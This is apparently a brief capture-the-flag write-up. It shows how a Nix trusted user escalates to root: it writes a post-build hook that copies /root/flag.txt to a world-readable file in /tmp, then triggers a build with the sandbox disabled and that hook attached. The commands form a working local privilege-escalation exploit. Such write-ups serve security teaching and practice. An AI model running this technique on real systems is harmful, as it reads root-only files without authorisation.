`nix show-config | grep -i trusted` shows `trusted-users = root ctf`, which means the user `ctf` is a trusted user.

create a post-build hook script that copies the flag file to a world-readable location on something like /tmp 

```sh
cp /root/flag.txt /tmp/flag
chmod 644 /tmp/flag
```

and then running the following command to trigger a fresh build and attach the post-build hook

```sh
nix-build --expr \
  'derivation {
     name = "pwn-'"$RANDOM"'";
     system = builtins.currentSystem;
     builder = "/bin/sh";
     args = [ "-c" "echo ok > $out" ];
   }' \
  --option sandbox false \
  --option post-build-hook /tmp/pwn.sh
```

then reading the flag from `/tmp/flag`:

```sh
cat /tmp/flag
```